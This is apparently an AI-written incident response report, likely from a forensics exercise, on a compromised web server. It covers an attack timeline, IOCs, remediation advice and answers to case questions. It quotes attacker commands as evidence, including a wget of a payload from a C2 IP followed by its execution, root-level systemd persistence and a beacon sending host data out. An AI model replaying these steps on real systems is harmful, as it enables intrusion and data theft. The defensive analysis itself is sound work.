All 9 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

Webserver-prod-02 was **compromised** via a two-stage attack. The attacker first gained a shell as the `www-data` service account (likely through a web application vulnerability), downloaded and executed malware from C2 server `185.229.59.103`, then pivoted to the `deploy` account via a stolen SSH key. Using `deploy`'s NOPASSWD sudo access to `systemctl`, the attacker installed a persistent C2 beacon as a systemd service running as root.

## Attack Timeline

| Time | Event | Evidence |
|------|-------|----------|
| *Unknown* | Attacker gains shell as `www-data`, runs recon (`id`, `uname -a`), downloads payload from `http://185.229.59.103/u` to `/tmp/.u`, executes it | `fs/var/www/.bash_history:1-7` |
| Apr 14 03:17:44 | Attacker SSH's into `deploy` from `185.229.59.103` using publickey | `auth.log:30` |
| Apr 14 03:18:02 | Recon: `sudo cat /etc/passwd` | `auth.log:32` |
| Apr 14 03:18:12 | Stages binary: `sudo cp /tmp/update /usr/local/bin/update` | `auth.log:35` |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` | `auth.log:36` |
| Apr 14 03:18:29 | Writes malicious systemd unit: `sudo tee /etc/systemd/system/system-updater.service` | `auth.log:37` |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | `auth.log:38` |
| Apr 14 03:18:58 | Enables persistence: `sudo systemctl enable system-updater.service` | `auth.log:39` |
| Apr 14 03:19:03 | Starts beacon: `sudo systemctl start system-updater.service` | `auth.log:40` |
| Apr 14 03:20:51 | Attacker disconnects SSH session | `auth.log:41` |

## Key Findings

### Confirmed

1. **Malicious systemd persistence** — `system-updater.service` runs as root and POSTs hostname and IP to `https://185.229.59.103:8443/beacon` every 600 seconds.
2. **C2 IP 185.229.59.103** — Confirmed C2 server. Used for payload hosting (HTTP), SSH access, and persistent beaconing (HTTPS:8443).
3. **deploy account compromised** — Logged in from C2 IP via SSH publickey (RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ). Attacker leveraged NOPASSWD sudo on `systemctl` to install root-level persistence.
4. **www-data post-exploitation activity** — Bash history shows recon, malware download (`wget http://185.229.59.103/u -O /tmp/.u`), execution, and credential file access.
5. **Overly permissive sudoers** — `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` enabled the attacker to install and start a root-level service without a password.

### Inferences

6. **History suppression** — The deploy account's `.bash_history` contains only routine CI/CD commands; the malicious sudo commands (lines 32–40 of auth.log) are absent. The attacker likely suppressed history recording (e.g., `HISTFILE=/dev/null`).
7. **Initial access via web vulnerability** — The www-data shell and subsequent lateral movement to deploy suggest initial access through a web application exploit, followed by SSH key theft/reuse for privilege escalation.

## Shell Histories Analyzed

| Account | Path | Commands | Notable Content |
|---------|------|----------|-----------------|
| **root** | `fs/root/.bash_history` | 4 | Normal admin commands (`apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f` log). No suspicious activity. |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Normal CI/CD workflow (`git pull`, `npm ci`, `npm test`, etc.). Attacker commands are **absent** — history was suppressed. |
| **alice** | `fs/home/alice/.bash_history` | 6 | Normal log review (`ls`, `cd /var/log`, `tail nginx/access.log`, `journalctl`). No suspicious activity. |
| **www-data** | `fs/var/www/.bash_history` | 7 | **Attacker activity**: recon (`id`, `uname -a`), malware download/execution from C2, credential file access. |

## IOCs

| Type | Value | Context |
|------|-------|---------|
| IP | `185.229.59.103` | C2 server — SSH source, payload host, beacon destination |
| URL | `http://185.229.59.103/u` | Malware download URL |
| URL | `https://185.229.59.103:8443/beacon` | Persistent C2 beacon endpoint |
| File | `/tmp/.u` | Downloaded malware payload (www-data stage) |
| File | `/usr/local/bin/update` | Staged binary (deploy stage) |
| File | `/etc/systemd/system/system-updater.service` | Malicious systemd unit |
| SSH Key | RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ | Compromised key used by attacker |

## Recommendations

1. **Immediate**: Disable and remove `system-updater.service`; remove `/usr/local/bin/update`
2. **Immediate**: Rotate all SSH keys for the `deploy` account; revoke the compromised key
3. **Immediate**: Block `185.229.59.103` at the perimeter firewall
4. **Short-term**: Restrict `deploy`'s sudoers to specific systemctl subcommands (e.g., `systemctl restart nginx` only), not bare `systemctl`
5. **Short-term**: Investigate the web application for the vulnerability that gave the attacker www-data shell access
6. **Long-term**: Enable HISTTIMEFORMAT and append-only history for all accounts; ship logs to a remote SIEM

---

## Case Questions

Case Q1: I analyzed shell histories for four accounts: **root** (`fs/root/.bash_history`, 4 commands), **deploy** (`fs/home/deploy/.bash_history`, 15 commands), **alice** (`fs/home/alice/.bash_history`, 6 commands), and **www-data** (`fs/var/www/.bash_history`, 7 commands). Note: **bob** had no shell history file in the evidence despite having an active login session in the auth log.

Case Q2: Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did during initial post-exploitation: they ran reconnaissance (`id`, `uname -a`), downloaded a malware payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), ran it in the background (`/tmp/.u &`), and read `/etc/passwd`. The **deploy** account's history does *not* show the attacker's actions (they suppressed history recording), but the auth.log's sudo trail (lines 32–40) documents everything the attacker did during that session: reading `/etc/passwd`, staging a binary, and installing/enabling/starting the malicious `system-updater.service` C2 beacon.